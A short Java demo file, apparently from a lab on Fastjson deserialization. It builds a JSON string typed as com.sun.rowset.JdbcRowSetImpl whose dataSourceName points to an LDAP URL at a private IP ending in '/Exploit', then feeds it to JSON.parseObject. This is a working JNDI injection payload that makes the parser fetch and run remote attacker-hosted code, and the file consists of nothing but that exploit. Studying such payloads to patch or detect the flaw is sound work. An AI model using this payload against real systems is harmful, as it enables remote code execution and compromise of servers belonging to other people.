package com.rmi;


import com.alibaba.fastjson.JSON;

public class ClientDemo {
    public static void main(String[] args) {
        String payload="{\n" +
                "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "        \"dataSourceName\":\"ldap://172.20.10.4:8888/Exploit\",\n" +
                "        \"autoCommit\":true\n" +
                "}";
        Object obj = JSON.parseObject(payload);
        System.out.println(obj);
    }
}

